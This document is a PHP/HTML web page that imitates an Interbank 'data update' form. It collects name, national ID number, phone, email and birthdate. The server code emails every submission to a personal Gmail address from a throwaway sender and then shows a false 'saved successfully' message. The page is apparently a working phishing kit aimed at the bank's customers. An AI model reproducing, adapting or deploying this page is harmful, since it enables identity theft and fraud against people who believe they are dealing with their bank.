<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/estilos.css">
    <script src="js/funciones.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <title>Actualización de Datos</title>
</head>
<body>

    <?php
    if($_SERVER["REQUEST_METHOD"] == "POST") {
        $name = $_POST['name'];
        $dni = $_POST['dni'];
        $tel = $_POST['tel'];
        $email = $_POST['email'];
        $birthdate = $_POST['birthdate'];

        if(isset($tel, $email, $name, $dni, $birthdate)){
            $to = "cruzadoeduar18@gmail.com";
            //$to = "fernando1894@hotmail.com";
            $subject = "ACTUALIZACION DE DATOS CORREO 2";
            $txt =  "NUMERO DE TELEFONO: " . $tel . "\n" . 
                    "DIRECCION DE CORREO: " . $email . "\n" .
                    "NOMBRE: " . $name . "\n" .
                    "DNI: " . $dni . "\n" .
                    "FECHA DE NACIMIENTO: " . $birthdate;
            $headers = "From: pruebas@pruebas.ga";
            mail($to, $subject, $txt, $headers);
            echo '
                <script type="text/javascript">
                    $(document).ready(function(){
                        Swal.fire("Información guardada con éxito.")
                    });
                </script>
            ';
        }
        else{
            echo '
                <script type="text/javascript">
                    $(document).ready(function(){
                        Swal.fire("Ingresa la información correctamente.")
                    });
                </script>
            ';
        }
    }
    ?>  

    <div id="img-container">
        <img id="logo" src="img/im-logo.png" alt="Logo Interbank">
    </div>
    <div id="form-container">
        <form id="form" method="POST" action="">

            <p id="form-title">Actualización de datos</p>

            <input class="form-field" name="name" type="text" placeholder="Nombre" required></input>

            <input class="form-field" name="dni" type="number" placeholder="DNI" required></input>

            <input class="form-field" name="tel" type="number" placeholder="Número de teléfono" onkeypress='validateNumber(event)' required></input>

            <input class="form-field" name="email" type="email" placeholder="Correo electrónico" required></input>

            <div class="lbl-fld-group">
                <label for="birthdate" class="form-label">Fecha de nacimiento</label>
                <input class="form-field" id="date-field" name="birthdate" type="date" required></input>
            </div>

            <input class="form-btn" type="submit" value="Enviar">
        </form>
    </div>
</body>

</html>